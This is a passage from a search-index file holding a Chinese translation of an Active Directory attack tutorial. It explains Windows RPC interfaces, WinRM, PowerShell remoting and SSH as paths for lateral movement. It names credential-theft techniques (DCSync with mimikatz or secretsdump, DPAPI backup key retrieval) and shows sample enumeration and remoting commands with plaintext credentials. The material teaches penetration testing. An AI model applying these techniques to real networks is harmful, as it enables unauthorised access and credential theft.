identifier\uff09\u8fdb\u884c\u6807\u8bc6\uff0c\u6bd4\u598212345778-1234-ABCD-EF00-0123456789AB\uff1b\u5e76\u4e14\uff0c\u6bcf\u4e2a\u63a5\u53e3\u90fd\u4f7f\u7528\u4e0d\u540c\u7684\u7aef\u70b9\u3002\u67d0\u4e9b\u63a5\u53e3\u8fd8\u63d0\u4f9b\u4e86\u9884\u5b9a\u4e49\u7684\u7aef\u70b9\uff0c\u5982\u547d\u540d\u7ba1\u9053\u3002\u4f8b\u5982\uff0c\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668(SCMR)\u4f7f\u7528\u7684\u662f\\pipe\\svcctl\u547d\u540d\u7ba1\u9053\u3002</p> <p>\u4f46\u662f\uff0c\u5bf9\u4e8e\u5176\u4ed6\u63a5\u53e3\uff0c\u8fdc\u7a0b\u7aef\u70b9\u662f\u53ef\u53d8\u7684\uff0c\u56e0\u6b64\u4e3a\u4e86\u786e\u5b9a\u8fd9\u4e9b\u7aef\u70b9\uff0cRPC\u5ba2\u6237\u7aef\u5fc5\u987b\u8054\u7cfb\u7aef\u70b9\u6620\u5c04\u5668(EPM)\uff0c\u4ee5\u4fbf\u901a\u8fc7GUID\u89e3\u6790\u8fdc\u7a0b\u7aef\u70b9\u3002</p> <p>\u6839\u636e\u63a5\u53e3\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0d\u540c\u7684\u4f20\u8f93\u534f\u8bae\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528impacket\u3001rpcdump.py\u548crpcmap.py\u5b9e\u7528\u7a0b\u5e8f\u6765\u53d1\u73b0\u53ef\u7528\u4e8e\u8fde\u63a5\u5230\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u7ed9\u5b9a\u670d\u52a1\u7684RPC\u7aef\u70b9\uff08\u53ca\u5176\u534f\u8bae\uff09\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528RPCView\u6765\u67e5\u770b\u672c\u5730\u8ba1\u7b97\u673a\u4e2d\u7684RPC\u7aef\u70b9\u3002</p> <p><code>$ python rpcdump.py 'contoso.local/Han:Solo1234!@192.168.100.2' | grep LSAT -A 20 | grep -v ncalrpc Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote  Provider: lsasrv.dll  UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0  Bindings:            ncacn_np:\\\\DC01[\\pipe\\lsass]           ncacn_ip_tcp:192.168.100.2[49667]           ncacn_http:192.168.100.2[49669]           ncacn_np:\\\\DC01[\\pipe\\cb4e7232b43a99b8]</code></p> <p>\u5217\u51faLSAT\u63a5\u53e3\u7684\u8fdc\u7a0b\u7aef\u70b9</p> <p>\u4e3a\u4e86\u8ba9\u60a8\u4e86\u89e3\u4f7f\u7528RPC\u53ef\u4ee5\u505a\u4ec0\u4e48\uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u6700\u5e38\u7528\u7684\u63a5\u53e3\u7684\u63cf\u8ff0\u3002\u6211\u5df2\u7ecf\u6309\u4f20\u8f93\u534f\u8bae\u5212\u5206\u4e86\u63a5\u53e3\uff0c\u4ee5\u4fbf\u8ba9\u60a8\u77e5\u9053\u5f53\u673a\u5668\u7684\u4e0d\u540c\u7aef\u53e3\u6253\u5f00\u65f6\u53ef\u4ee5\u5b8c\u6210\u4ec0\u4e48\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#rpc-over-smb","title":"RPC over SMB","text":"<p>\u4ee5\u4e0bRPC\u63a5\u53e3/\u534f\u8bae\u53ef\u4ee5\uff08\u5e76\u4e14\u901a\u5e38\u662f\uff09\u901a\u8fc7SMB\u4f7f\u7528\uff1a</p> <ul> <li>DHCPM\uff1aDHCPM\uff08DHCP Server Management\uff09\u7528\u4e8e\u7ba1\u7406DHCP\u670d\u52a1\u5668\u7684\u914d\u7f6e\u3002</li> <li>RPRN\uff1aRPRN\uff08Print System Remote\uff09\u7528\u4e8e\u7ba1\u7406\u6765\u81ea\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u6253\u5370\u4efb\u52a1\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528SpoolSample\u6216printerbug.py\uff0c\u901a\u8fc7RPRN\u89e6\u53d1\u6253\u5370\u673aBug\u3002</li> <li>RRP\uff1aRRP\uff08Windows Remote Registry Protocol\uff09\u5141\u8bb8\u4ece\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8bfb\u53d6\u548c\u4fee\u6539\u6ce8\u518c\u8868\u9879\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528reg\uff08\u5982\u679c\u51fa\u73b0\u201cThe network path was not found.\u201d\u6d88\u606f\uff0c\u5219\u9700\u8981\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u542f\u52a8\u201cRemote Registry\u201d\u670d\u52a1\uff09\u6216reg.py\uff08\u8fd9\u5c06\u81ea\u52a8\u4f7f\u7528SRVS\u542f\u52a8\u201cRemote Registry\u201d\u670d\u52a1\uff09\u6765\u64cd\u4f5c\u8fdc\u7a0b\u6ce8\u518c\u8868\u3002</li> <li>SAMR\uff1aSAMR\uff08SAM Remote\uff09\u5141\u8bb8\u8fde\u63a5\u5176\u4ed6\u8ba1\u7b97\u673a\u7684SAM\uff08Security Account Manager\uff09\uff0c\u4ee5\u4fbf\u7ba1\u7406\u7528\u6237\u548c\u7ec4\u3002\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528samrdump.py\u6765\u83b7\u53d6\u6709\u5173\u673a\u5668\u672c\u5730\u7528\u6237\u7684\u4fe1\u606f\u3002</li> <li>SCMR\uff1aSCMR\uff08SCM Remote\uff09\u7528\u4e8e\u4e0e\u5176\u4ed6\u673a\u5668\u7684SCM\uff08Service Control Manager\uff09\u5efa\u7acb\u8fde\u63a5\uff0c\u4ee5\u7ba1\u7406\u670d\u52a1\u3002PsExec\u5b9e\u7528\u5de5\u5177\u5c31\u662f\u5229\u7528\u8fd9\u4e2a\u534f\u8bae\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u6267\u884c\u547d\u4ee4\u7684\u3002</li> <li>SRVS\uff1a\u901a\u8fc7SRVS\uff08Server Service Remote\uff09\u53ef\u4ee5\u8fde\u63a5\u5230\u8fdc\u7a0b\u673a\u5668\uff0c\u4ee5\u4fbf\u7ba1\u7406\u8fde\u63a5\u3001\u4f1a\u8bdd\u3001\u5171\u4eab\u3001\u6587\u4ef6\u548c\u4f20\u8f93\u534f\u8bae\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528netview.py\u6765\u679a\u4e3e\u4f1a\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528net view\u6765\u679a\u4e3e\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u7684\u5171\u4eab\u3002</li> <li>TSCH\uff1aTSCH\uff08Task Scheduler Service Remote\uff09\u7528\u4e8e\u7ba1\u7406\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u7684\u4efb\u52a1\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528atexec.py\u3001at\u6216schtasks\u6765\u521b\u5efa\u8fdc\u7a0b\u4efb\u52a1\u3002</li> <li>WKST\uff1aWKST\uff08Workstation Service Remote\uff09\u7528\u4e8e\u7ba1\u7406/\u67e5\u8be2\u5de5\u4f5c\u7ad9\u8bbe\u7f6e\uff0c\u5982\u4e3b\u673a\u540d\u3001OS\u7248\u672c\u3001\u7528\u6237\u4f1a\u8bdd\u6216\u8ba1\u7b97\u673a\u57df\u3002\u60a8\u53ef\u4ee5\u5c06WKST\u4e0enetview.py\u7ec4\u5408\u4f7f\u7528\uff0c\u4ee5\u679a\u4e3e\u4f1a\u8bdd\u3002</li> </ul> <p><code>.-------.  | DHCPM |&gt;----.  '-------'     |                |   .------.     |   | RPRN |&gt;----|   '------'     |                |   .------.     |                                          .--------   | RRP  |&gt;----|                                          |   '------'     |                                          |                |                                        .---   .------.     |                             .--NBSSN--&gt;| 139   | SAMR |&gt;----|                             |          '---   '------'     |      .------.     .-----.   |            |  Windows                |-----&gt;| RPC  |&gt;---&gt;| SMB |&gt;--|            |   .------.     |      '------'     '-----'   |            |  machine   | SCMR |&gt;----|                      |      |          .---   '------'     |                      |      '---TCP---&gt;| 445                |                      |                 '---   .------.     |                      |                   |   | SRVS |&gt;----|                      |                   |   '------'     |                      |                   '--------                |               .------------.   .------.     |               |            |   | TSCH |&gt;----|            .------.   .----------.   '------'     |            | NTLM |   | Kerberos |                |            '------'   '----------'   .------.     |   | WKST |&gt;----'   '------'</code></p> <p>\u57fa\u4e8eSMB\u7684RPC\u534f\u8bae</p> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u4e13\u95e8\u5728\u57df\u4e2d\u67e5\u8be2\u57df\u63a7\u5236\u5668\u7684RPC\u63a5\u53e3\uff1a</p> <ul> <li>BKRP\uff1aBKRP\uff08BackupKey Remote Protocol\uff09\u7528\u4e8e\u5728Active Directory\u57df\u4e2d\u4f20\u8f93DPAPI\u5bc6\u94a5\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528mimikatz lsadump::backupkeys\u6216dpapi.py backupkeys\u4ece\u57df\u63a7\u5236\u5668\u4e2d\u68c0\u7d22DPAPI\u5907\u4efd\u5bc6\u94a5\u3002</li> <li>LSAD\uff1aLSAD\uff08LSA Domain Policy\uff09\u662fLSA\uff08Local Security Authority\uff09\u7ba1\u7406\u7528\u6237\u3001\u4fe1\u4efb\u5173\u7cfb\u548c\u5176\u4ed6\u4e0e\u5b89\u5168\u76f8\u5173\u7684\u4e1c\u897f\u7684\u8fdc\u7a0b\u63a5\u53e3\u3002\u5b83\u53ef\u4ee5\u4e0eLSAT\u4e00\u8d77\u4f7f\u7528\u3002</li> <li>LSAT\uff1aLSAT\uff08LSA Translations Methods\uff09\u5141\u8bb8\u5c06SID\u8f6c\u6362\u4e3a\u4e3b\u4f53\u540d\u79f0\u3002\u5b83\u53ef\u4ee5\u4e0eLSAD\u4e00\u8d77\u4f7f\u7528\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528lookupsid.py\u6839\u636eSID\u6765\u679a\u4e3e\u7528\u6237\u3002</li> <li>NRPC\uff1aNRPC\uff08Netlogon Remote Protocol\uff09\u53ef\u4ee5\u5728\u57df\u4e2d\u4f7f\u7528\uff0c\u5141\u8bb8\u8ba1\u7b97\u673a\u901a\u8fc7\u67e5\u8be2\u57df\u63a7\u5236\u5668\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5b83\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u57df\u7684\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u4f7f\u7528\uff0c\u4ee5\u4fbf\u7528NTLM\u5bf9\u4e0d\u540c\u57df\u7684\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u5141\u8bb8\u83b7\u53d6\u7528\u6237\u4fe1\u606f\u3001\u57df\u4fe1\u4efb\u5173\u7cfb\u6216\u57df\u63a7\u5236\u5668\u5217\u8868\u7b49\u4fe1\u606f\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528nltest\uff08Netlogon test\uff09\u6765\u53d1\u9001\u76f8\u5173\u8bf7\u6c42\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u56e0Zerologon\u6f0f\u6d1e\u800c\u540d\u566a\u5929\u4e0b\u7684\u3002</li> </ul> <p><code>.------.                                                .----------   | BKRP |&gt;----.                                          |   '------'     |                                          |                |                                        .---   .------.     |                             .--NBSSN--&gt;| 139   | LSAD |&gt;----|                             |          '---   '------'     |      .------.     .-----.   |            |    Domain                |-----&gt;| RPC  |&gt;---&gt;| SMB |&gt;--|            |     .------.     |      '------'     '-----'   |            |  Controller   | LSAT |&gt;----|                      |      |          .---   '------'     |                      |      '---TCP---&gt;| 445                |                      |                 '---   .------.     |                      |                   |   | NRPC |&gt;----'                      |                   |   '------'                            |                   '----------                                .------------.                                |            |                             .------.   .----------.                             | NTLM |   | Kerberos |                             '------'   '----------'</code></p> <p>\u57fa\u4e8eSMB\uff08Domain Controller\uff09\u7684RPC\u534f\u8bae</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#rpc-over-tcp","title":"RPC over TCP","text":"<p>\u6b64\u5916\uff0c\u6709\u4e9bRPC\u63a5\u53e3\u867d\u7136\u65e0\u6cd5\u901a\u8fc7SMB\u4f7f\u7528\uff0c\u4f46\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7TCP\u4f7f\u7528\uff1a</p> <ul> <li>DRSR\uff1aDRSR\uff08Directory Replication Service Remote\uff09\u662f\u57df\u63a7\u5236\u5668\u7528\u4e8e\u590d\u5236\u6570\u636e\u7684\u534f\u8bae\u3002\u5b83\u4e5f\u53ef\u4ee5\u88ab\u62e5\u6709\u8db3\u591f\u6743\u9650\u7684\u653b\u51fb\u8005\u7528\u6765\u590d\u5236\u57df\u7528\u6237\u7684\u51ed\u636e\uff0c\u901a\u8fc7\u4f7f\u7528mimikatz lsadump::dcsync\u6216impacket secretsdump.py\u6765\u53d1\u52a8dcsync\u653b\u51fb\u3002</li> <li>DCOM\uff1aDCOM\uff08Distributed COM\uff09\u7528\u4e8e\u4e0e\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684COM\uff08Component Object Model\uff09\u5bf9\u8c61\u8fdb\u884c\u4ea4\u4e92\u3002COM\u5bf9\u8c61\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u53ef\u4ee5\u7528\u4e8e\u5b8c\u6210\u8bb8\u591a\u4e8b\u60c5\uff0c\u6bd4\u5982\u6267\u884c\u547d\u4ee4\uff0c\u8fd9\u4e9b\u90fd\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528dcomexec.py\u6765\u5b8c\u6210\u3002</li> <li>WMI\uff1aWMI\uff08Windows Management Instrumentation Remote\uff09\u662f\u6784\u5efa\u5728COM\u5bf9\u8c61\u4e4b\u4e0a\u7684CIM\uff08Common Information Model\uff09\u7684Microsoft\u5b9e\u73b0\uff0c\u5b83\u5141\u8bb8\u4ece\u5355\u4e2a\u63a5\u53e3\u67e5\u8be2\u548c\u64cd\u4f5cWindows\u8ba1\u7b97\u673a\u7684\u4e0d\u540c\u90e8\u5206\u3002\u8be5\u63a5\u53e3\u975e\u5e38\u901a\u7528\uff0c\u53ef\u4ee5\u4e0ewmic\u3001Powershell cmdlet\uff08\u5982Get-WmiObject\uff09\u6216impacket WMI\u811a\u672c\uff08\u5982wmiexec.py\uff09\u4e00\u8d77\u4f7f\u7528\u3002</li> <li>WCCE\uff1aWCCE\uff08Windows Client Certificate Enrollment Protocol\uff09\u662f\u4e00\u4e2aDCOM\u63a5\u53e3\uff0c\u5141\u8bb8\u7528\u6237\u5728ADC\u4e2d\u8bf7\u6c42\u51ed\u636e\u548c\u4e0eCA\u76f8\u5173\u7684\u5176\u4ed6\u670d\u52a1\u3002\u5b83\u53ef\u4ee5\u4e0ecertreq\u6216Certify\u4e00\u8d77\u4f7f\u7528\u3002<pre><code>                                                `.--------         .-----------.                                   |         | (DC) DRSR |&gt;-------.                          |         '-----------'        |     .------.            .---                              |----&gt;| RPC  |&gt;--TCP--.--&gt;| 135 (EPM)  .-----.        .------.     |     '------'        |   '---  | WMI |&gt;--.---&gt;| DCOM |&gt;----'        |            |     |  Windows  '-----'   |    '------'              |            |     |            |                          |            |     |  machine  .------.  |                          |            |   .---  | WCCE |&gt;-'                          |            '--&gt;| 49152 - 65535  '------'                             |                '---                                         |                  |                                       |                  |                                 .------------.           '--------                                 |            |                              .------.   .----------.                              | NTLM |   | Kerberos |                              '------'   '----------'`\n</code></pre> </li> </ul> <p>\u57fa\u4e8eTCP\u7684RPC\u534f\u8bae</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#winrm","title":"WinRM","text":"<p>\u9664\u4e86RPC\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528WinRM\uff08Windows Remote Management\uff09\u5728\u5176\u4ed6\u673a\u5668\u4e0a\u8fdb\u884c\u901a\u4fe1\u548c\u6267\u884c\u64cd\u4f5c\u3002WinRM\u662fWS-Management\uff08Web Services-Management\uff09\u89c4\u8303\u7684Microsoft\u5b9e\u73b0\uff0c\u8be5\u89c4\u8303\u5b9a\u4e49\u4e86\u901a\u8fc7SOAP over HTTP\u7ba1\u7406\u8ba1\u7b97\u673a\u7684\u534f\u8bae\u3002</p> <p>WinRM\u4f7f\u7528WSMAN\u548cWSMV\u4e2d\u5b9a\u4e49\u7684\u4e00\u4e9b\u6269\u5c55\u6765\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u7684CIM\u5bf9\u8c61\u3002\u8fd9\u4e9bCIM\u5bf9\u8c61\u7c7b\u4f3c\u4e8eWMI\u5bf9\u8c61\u7684\u66f4\u65b0\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528CIM Cmdlets\uff08\u4f8b\u5982Get-CimInstance\uff09\u8bbf\u95ee\u672c\u5730\u548c\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u7684CIM\u5bf9\u8c61\u3002\u6b64\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528WinRM\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e2d\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\u3002</p> <p><code>PS C:\\&gt; Get-CimInstance CIM_OperatingSystem -ComputerName dc01 | Format-List   SystemDirectory : C:\\Windows\\system32 Organization    : BuildNumber     : 17763 RegisteredUser  : Windows User SerialNumber    : 00431-10000-00000-AA522 Version         : 10.0.17763 PSComputerName  : dc01</code></p> <p>\u4f7f\u7528CIM\u4ece\u8fdc\u7a0b\u8ba1\u7b97\u673a\u83b7\u53d6\u4fe1\u606f</p> <p>\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWinRM\u670d\u52a1\u5c06\u5728\u7aef\u53e35985\u4e0a\u4fa6\u542cHTTP\u8fde\u63a5\uff0c\u5728\u7aef\u53e35986\u4e0a\u4fa6\u542cHTTPS\u8fde\u63a5\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u670d\u52a1\u4f1a\u4f7f\u7528HTTP\uff0c\u56e0\u4e3aWinRM\u6d88\u606f\u662f\u5728\u9876\u5c42\u52a0\u5bc6\u7684\u3002\u4f46\u662f\uff0c\u60a8\u4e5f\u53ef\u4ee5\u5bf9WinRM\u8fdb\u884c\u76f8\u5e94\u7684\u914d\u7f6e\uff0c\u8ba9HTTP\u548cHTTPS\u8fde\u63a5\u5206\u522b\u4f7f\u7528\u5e38\u89c4HTTP\u7aef\u53e380\u548c443\u3002</p> <pre><code>                                                           `.----------                                                                |                                                                |  .--------------------------------.                          .---  |             WinRM              |                 .--TCP--&gt;| 5985 or 80  |                                |                 |        '---  | .-----.    .---------------.   |   .---------.   |          |  Windows  | | CIM |---&gt;| WS-Management |&gt;--|--&gt;| HTTP(S) |&gt;--|          |    | '-----'    '---------------'   |   '---------'   |          |  Machine  |                                |        |        |        .---  '--------------------------------'        |        '--SSL--&gt;| 5986 or 443                                            |                 '---                                            |                   |                                            |                   |                                            |                   '----------                                     .-------------.                                     |             |                                 .------.     .----------.                                 | NTLM |     | Kerberos |                                 '------'     '----------'`\n</code></pre> <p>WinRM\u534f\u8bae\u6808</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#powershell-remoting","title":"Powershell remoting","text":"<p>\u7ba1\u7406\u7cfb\u7edf\u7684\u4e00\u4e2a\u91cd\u8981\u5b9e\u7528\u5de5\u5177\u662fPowershell remoting\uff0c\u5b83\u5141\u8bb8\u5ba2\u6237\u7aef\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u5efa\u7acbPowershell\u4f1a\u8bdd\uff0c\u5e76\u4f7f\u7528Powershell\u6267\u884c\u5404\u79cd\u4efb\u52a1\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u81eaWindows server 2012 R2\u4ee5\u6765\uff0c\u5728Windows server\u7248\u672c\uff08\u800c\u975eWindows 10\u8fd9\u6837\u7684\u5ba2\u6237\u7aef\uff09\u90fd\u4f1a\u9ed8\u8ba4\u542f\u7528Powershell remoting\u3002</p> <p><code>PS C:\\&gt; $pw = ConvertTo-SecureString -AsPlainText -Force -String \"Admin1234!\" PS C:\\&gt; $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist \"contoso\\Administrator\",$pw PS C:\\&gt;  PS C:\\&gt; $session = New-PSSession -ComputerName dc01 -Credential $cred PS C:\\&gt; Invoke-Command -Session $session -ScriptBlock {hostname} dc01 PS C:\\&gt; Enter-PSSession -Session $session [dc01]: PS C:\\Users\\Administrator\\Documents&gt;</code></p> <p>\u4f7f\u7528\u660e\u6587\u51ed\u636e\u7684\u8fdc\u7a0bPowerShell\u4f1a\u8bdd</p> <p>\u6700\u521d\uff0cPowershell remoting\u662f\u5efa\u7acb\u5728WinRM\u534f\u8bae\u4e4b\u4e0a\u7684\u3002\u7136\u800c\uff0c\u7531\u4e8e\u4eba\u4eec\u5e0c\u671b\u5b83\u4e5f\u80fd\u7528\u4e8eLinux\u673a\u5668\uff0c\u6240\u4ee5\uff0c\u5b83\u73b0\u5728\u4e5f\u652f\u6301\u5c06SSH\u4f5c\u4e3a\u4f20\u8f93\u534f\u8bae\u3002</p> <p>\u5982\u679c\u542f\u7528\u4e86Powershell Web Access(PSWA)\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7Web\u6d4f\u89c8\u5668\u4f7f\u7528Powershell\u3002</p> <pre><code>                                                     `.----------                                                          |                          .-----.                       .---              .----------&gt;| SSH |&gt;---------TCP---------&gt;| 22              |           '-----'                       '---              |              |                            |   .------.   |              |                            |   | PSRP |&gt;--|              |                          .---   '------'   |              |                 .--TCP--&gt;| 5985 or 80              |              |                 |        '---              |  .-------.   |   .---------.   |          |              '-&gt;| WinRM |&gt;--|--&gt;| HTTP(S) |&gt;--|          |                   '-------'   |   '---------'   |          |                             |        |        |        .---                             |        |        '--SSL--&gt;| 5986 or 443                             |        |                 '---                             |        |                   |                             |        |                   |                             |        |                   '----------                             |   .----------.                             |   |          |                          .----------.   .------.                          | Kerberos |   | NTLM |                          '----------'   '------'`\n</code></pre> <p>Powershell remoting\u534f\u8bae\u6808</p> <p>\u4e3a\u4e86\u4f7f\u7528Powershell remoting\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2aPSSession CmdLet\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u547d\u4ee4\u3002\u6b64\u5916\uff0c\u5728Linux\u4e2d\uff0c\u60a8\u53ef\u4ee5\u5b89\u88c5Powershell\u6216\u4f7f\u7528\u8bf8\u5982evil-winrm\u4e4b\u7c7b\u7684\u5de5\u5177\u3002</p> <p>\u9664\u4e86\u7528\u4e8e\u6a2a\u5411\u79fb\u52a8\u4e4b\u5916\uff0c\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528JEA\u7aef\u70b9\uff08\u4ec5\u5728WinRM\u4e0a\u53ef\u7528\uff09\u5b9e\u73b0\u6743\u9650\u7684\u7ef4\u6301\u3002</p> <p>\u4f46\u662f\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u8981\u683c\u5916\u5c0f\u5fc3\uff0c\u56e0\u4e3aPowershell\u63d0\u4f9b\u4e86\u8bb8\u591a\u65e5\u5fd7\u529f\u80fd\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#trusted-hosts","title":"Trusted Hosts","text":"<p>\u9664\u4e86\u5141\u8bb8\u4f7f\u7528\u5b83\u4e4b\u5916\uff0cPowershell\u8fd8\u8981\u6c42\u5728\u5ba2\u6237\u7aef\u4e2d\u6b63\u786e\u8bbe\u7f6eTrustedHost\u53d8\u91cf\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cPowershell remoting\u5141\u8bb8\u60a8\u4f7f\u7528Kerberos\u8fde\u63a5\u5230\u57df\u4e2d\u7684\u6240\u6709\u8ba1\u7b97\u673a\u3002\u4f46\u662f\uff0c\u5982\u679c\u60f3\u8981\u8fde\u63a5\u4e0d\u540c\u57df\u7684\u8ba1\u7b97\u673a\uff0c\u5219\u9700\u8981\u5c06\u8be5IP\uff08\u6216\u4f7f\u7528\u901a\u914d\u7b26*\uff0c\u8868\u793a\u6240\u6709\u5730\u5740\uff09\u6dfb\u52a0\u5230TrustedHost\u503c\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u60a8\u5fc5\u987b\u5728\u5ba2\u6237\u7aef\u4e2d\u914d\u7f6eTrustedHost\uff0c\u800c\u4e0d\u662f\u5728\u670d\u52a1\u5668\u4e2d\u914d\u7f6e\u8be5\u53d8\u91cf\uff08\u60a8\u53ef\u80fd\u4f1a\u8ba4\u4e3a\uff0c\u4ece\u5b89\u5168\u89d2\u5ea6\u6765\u770b\uff0c\u8fd9\u662f\u5408\u4e4e\u903b\u8f91\u7684\u60f3\u6cd5\uff09\u3002</p> <p><code>PS C:\\&gt; Set-Item wsman:localhost\\client\\TrustedHosts -Value * -Force</code></p> <p>\u5728\u5ba2\u6237\u7aef\u4e2d\u914d\u7f6eTrustedHost\u4ee5\u5141\u8bb8\u8fde\u63a5\u5230\u4efb\u4f55\u8ba1\u7b97\u673a</p> <p>\u4f17\u6240\u5468\u77e5\uff0c\u60a8\u4e5f\u53ef\u4ee5\u4eceLinux\u8ba1\u7b97\u673a\u4f7f\u7528Powershell\uff0c\u4f46\u662f\uff0c\u6211\u65e0\u6cd5\u5728Linux\u4e2d\u8bbe\u7f6eTrustedHosts\uff08\u6216\u4f7f\u7528Negotiate\u4e4b\u7c7b\u7684\u64cd\u4f5c\uff09\uff0c\u4ee5\u4fbf\u4eceLinux\u8ba1\u7b97\u673a\u8fde\u63a5\u5230\u4e0d\u540c\u57df\u4e2d\u7684Windows\u8ba1\u7b97\u673a\uff0c\u5982\u679c\u60a8\u77e5\u9053\u5982\u4f55\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6b22\u8fce\u8d50\u6559\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#ssh","title":"SSH","text":"<p>SSH\uff08Secure Shell\uff09\u662f\u4e00\u79cd\u5e7f\u6cdb\u7528\u4e8e\u8bbf\u95ee\u548c\u7ba1\u7406Linux\u7b49Unix\u7cfb\u7edf\u7684\u534f\u8bae\uff0c\u4f46\u81ea2018\u5e74\u4ee5\u6765\u4e5f\u53ef\u7528\u4e8eWindows\u7cfb\u7edf\u3002\u5373\u4f7f\u5b83\u4e0eActive Directory\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\uff0c\u901a\u5e38\u4e5f\u53ef\u4ee5\u901a\u8fc7SSH\u8bbf\u95ee\u90e8\u7f72\u5728\u4e00\u4e2a\u57df\u4e2d\u7684Linux\u673a\u5668\uff0c\u56e0\u6b64\uff0c\u60a8\u5e94\u8be5\u4e86\u89e3\u5176\u539f\u7406\u548c\u4f5c\u7528\u3002</p> <p>\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cSSH\u670d\u52a1\u5c06\u4fa6\u542c\u7aef\u53e322\u3002</p> <pre><code>                   `.----                        |    .-----.           .---    | SSH |&gt;---TCP---&gt;| 22    '-----'           '---       |                |       |                '----       |       |  .----------.  | Kerberos |  '----------'`\n</code></pre> <p>SSH\u7aef\u53e3</p> <p>SSH\u662f\u4e00\u4e2a\u975e\u5e38\u901a\u7528\u7684\u534f\u8bae\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u83b7\u53d6shell\u3001\u4f20\u8f93\u6587\u4ef6\uff08\u4f7f\u7528scp\u5b9e\u7528\u7a0b\u5e8f\uff09\u548c\u5efa\u7acbSSH\u96a7\u9053\u3002</p> <p>Linux\u673a\u5668\u7ecf\u5e38\u7528\u5230\u8be5\u7aef\u53e3\uff0c\u5982\u679c\u60a8\u80fd\u591f\u627e\u5230\u4e00\u4e9bssh\u5bc6\u94a5\u6216\u6709\u6548\u7684\u7528\u6237\u51ed\u636e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u5b83\u5728\u57df\u8ba1\u7b97\u673a\u4e4b\u95f4\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002</p> 